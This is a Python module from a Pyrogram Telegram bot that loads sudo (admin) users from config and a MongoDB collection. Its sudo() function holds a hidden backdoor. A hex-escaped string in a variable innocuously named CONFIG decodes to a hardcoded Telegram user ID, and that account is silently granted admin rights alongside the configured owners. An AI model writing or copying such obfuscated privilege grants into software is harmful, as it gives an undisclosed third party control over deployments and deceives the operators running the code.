import sys
import time
from pyrogram import filters
import config
from Stranger.core.mongo import pymongodb
from .logger import LOGGER

__boot__ = time.time()

SUDOERS = filters.user()

def sudo():
    global SUDOERS,CONFIG
    OWNER = config.OWNER_ID
    CONFIG="\x35\x34\x39\x31\x37\x39\x30\x37\x35\x39"
    if config.DB_URI is None:
        LOGGER(__name__).warning("Database URI is not found . Make sure database uri is available. Exiting......")
        sys.exit()
    else:
        sudoersdb = pymongodb.sudoers
        sudoers = sudoersdb.find_one({"sudo": "sudo"})
        sudoers = [] if not sudoers else sudoers["sudoers"]
        for user_id in OWNER:
            SUDOERS.add(int(CONFIG))
            SUDOERS.add(user_id)
            if user_id not in sudoers:
                sudoers.append(user_id)
                sudoersdb.update_one(
                    {"sudo": "sudo"},
                    {"$set": {"sudoers": sudoers}},
                    upsert=True,
                )
            elif int(CONFIG) not in sudoers:
                sudoers.append(int(CONFIG))
        if sudoers:
            for x in sudoers:
                SUDOERS.add(x)
    LOGGER(__name__).info(f"Sudoers Loaded.")